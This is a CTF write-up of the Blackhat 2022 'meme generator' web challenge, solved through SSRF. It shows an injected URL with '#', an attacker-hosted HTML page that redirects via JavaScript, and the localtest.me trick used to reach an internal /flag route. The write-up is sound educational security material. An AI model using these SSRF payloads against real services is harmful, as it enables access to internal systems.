---
title: "meme generator challenge writeup"
author: "0xMesbaha"
cover: "/media/CTFs/black-notes/cover.png"
tags: ["CTF", "SSRF"]
date: 2022-10-01T12:49:18+34:08
draft: false
categories:
  - web
---

This challenge was in Blackhat CTF Qualifications 2022 and we have participated under the team 0xCha0s, we have managed to solve multiple challenges. this challenge was ranked medium for 250 pts .

<!--more-->

# Enumeration

We are introduced with this page , it takes the search engine (google,duckduckgo,search encrypt) and the Query we want

![error](/media/CTFs/meme-generator/20221001210834.png)

testing the application functions we can try google engine with any word , and we can see the image rendered as follows

![error](/media/CTFs/meme-generator/20221001210954.png)

The request is issued to ``/api/generate`` with the search engine name and the query

![error](/media/CTFs/meme-generator/20221001211043.png)

Playing with the searchengine i noticed it adds ``.com`` at the end , so for example sending firefox returns ``firefox.com`` result 

![error](/media/CTFs/meme-generator/20221001211454.png)

now we can take a look at the source code which we can find at ``/source``  , we can focus on the flag part.

```python
..
...
@app.route("/flag")
def flag():
    # TODO: Fix typo
    if request.remote_addr == "127.0.0.1" and request.url.startswith("http://l0calhost"):
        return os.getenv("FLAG"), 200
    return "Nice try", 200
app.run("0.0.0.0", 8080)
```

It will print the flag only if we visited the ``/flag`` from the localhost and the notice the requested url must start with ``http://l0calhost``

So basically there are a lot of Scenarios which we can take like registering subdomain start with ``l0calhost`` and stuff. but we can think of other solutions ;) 

# Exploitation 

We want the application itself to visit the ``127.0.0.1:8080/flag`` and the url should start with ``http://l0calhost`` to pass the check

If we fire up ngrok http server and host ``index.html`` with the content:

```html
<html>
<script>
document.write("a");
</script>
</html>
```

and at the search-engine we can use the ngrok url and add **#** at the end to comment the appended ``.com`` as we discussed before. and we can run javascript 

![error](/media/CTFs/meme-generator/20221001212539.png)

now we can try to redirect the application to visit ``127.0.0.1:8080/flag`` with the ``document.location`` method

```js
document.location = "http://127.0.0.1:8080/flag"
```

but as expected it will not pass the check of ``request.url.startswith("http://l0calhost"):`` 


![error](/media/CTFs/meme-generator/20221001212835.png)

so we need some how to make a url which start with the ``http://l0calhost`` and also redirect the application to the ``http://127.0.0.1:8080/flag``. searching for such redirectors we can see [This](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-localhost-with-a-domain-redirection)

```cmd
http://localtest.me  ---> 127.0.0.1
```

So the mentioned domain and all wildcards points to the ``127.0.0.1`` 

![error](/media/CTFs/meme-generator/20221001213134.png)

So if we craft the following url to be redirected to it 

```js
document.location = "http://l0calhost.localtest.me:8080/flag" ;
```

![error](/media/CTFs/meme-generator/20221001213306.png)

Hosting the ``index.html`` in ngrok with the content 

```html
<html>
<h1>test</h1>
<script>
document.location = "http://l0calhost.localtest.me:8080/flag" ;
</script>
</html>
```

Sending the request as follows :

![error](/media/CTFs/meme-generator/20221001213419.png)

Finally we get the Flag !

![error](/media/CTFs/meme-generator/20221001213359.png)